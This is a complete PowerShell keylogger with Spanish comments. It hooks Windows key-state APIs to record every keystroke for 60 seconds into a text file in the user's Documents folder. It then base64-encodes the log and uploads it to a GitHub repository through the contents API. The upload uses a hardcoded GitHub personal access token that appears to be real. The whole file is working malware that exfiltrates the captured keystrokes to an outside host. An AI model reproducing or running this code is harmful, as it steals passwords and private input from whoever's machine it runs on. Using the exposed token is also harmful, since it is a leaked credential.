# Variables
$token = "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"  # Reemplaza con tu token de acceso personal de GitHub
$repoOwner = "SAHIBADAS"  # Reemplaza con tu nombre de usuario o la organización del repositorio
$repoName = "Prueba_klg"  # Reemplaza con el nombre de tu repositorio
$filePath = "$env:USERPROFILE\Documents\keylog.txt"
$name = "keylog"
$path = "$env:USERPROFILE\Documents\$name.txt"
$branch = "main"  # Cambia si usas otra rama
$commitMessage = "Prueba desde otro dispositivo"
$apiUrl = "https://api.github.com/repos/$repoOwner/$repoName/contents/$(Split-Path -Leaf $filePath)"

# Iniciar temporizador
$startTime = Get-Date

# MAIN
if ((Test-Path $path) -eq $false) { New-Item $path }

$signatures = @'
[DllImport("user32.dll", CharSet=CharSet.Auto, ExactSpelling=true)]
public static extern short GetAsyncKeyState(int virtualKeyCode);
[DllImport("user32.dll", CharSet=CharSet.Auto)]
public static extern int GetKeyboardState(byte[] keystate);
[DllImport("user32.dll", CharSet=CharSet.Auto)]
public static extern int MapVirtualKey(uint uCode, int uMapType);
[DllImport("user32.dll", CharSet=CharSet.Auto)]
public static extern int ToUnicode(uint wVirtKey, uint wScanCode, byte[] lpkeystate, System.Text.StringBuilder pwszBuff, int cchBuff, uint wFlags);
'@

$API = Add-Type -MemberDefinition $signatures -Name 'Win32' -Namespace API -PassThru

try {
    while (((Get-Date) - $startTime).TotalSeconds -lt 60) {
        Start-Sleep -Milliseconds 40
        
        for ($ascii = 9; $ascii -le 254; $ascii++) {
            $state = $API::GetAsyncKeyState($ascii)
            
            if ($state -eq -32767) {
                $null = [console]::CapsLock
                $virtualKey = $API::MapVirtualKey($ascii, 3)
                $kbstate = New-Object -TypeName Byte[] -ArgumentList 256
                $checkkbstate = $API::GetKeyboardState($kbstate)
                $mychar = New-Object -TypeName System.Text.StringBuilder
                $success = $API::ToUnicode($ascii, $virtualKey, $kbstate, $mychar, $mychar.Capacity, 0)

                if ($success -and (Test-Path $path) -eq $true) {
                    [System.IO.File]::AppendAllText($Path, $mychar, [System.Text.Encoding]::Unicode)
                }
            }
        }
    }

    Start-Sleep -Seconds 1

    # Leer el contenido del archivo y convertirlo a base64
    $fileContent = [System.IO.File]::ReadAllBytes($filePath)
    $fileContentBase64 = [Convert]::ToBase64String($fileContent)

    # Crear el cuerpo de la solicitud
    $body = @{
        message = $commitMessage
        branch = $branch
        content = $fileContentBase64
    } | ConvertTo-Json

    # Encabezados de la solicitud
    $headers = @{
        "Authorization" = "Bearer $token"
        "Accept" = "application/vnd.github.v3+json"
    }

    # Subir el archivo
    try {
        $response = Invoke-RestMethod -Uri $apiUrl -Method Put -Headers $headers -Body $body
        Write-Output "Archivo subido exitosamente. URL: $($response.content.html_url)"
    } catch {
        Write-Error "Error al subir el archivo: $_"
    }

} catch {
    Write-Error "Error al procesar el archivo: $_"
}
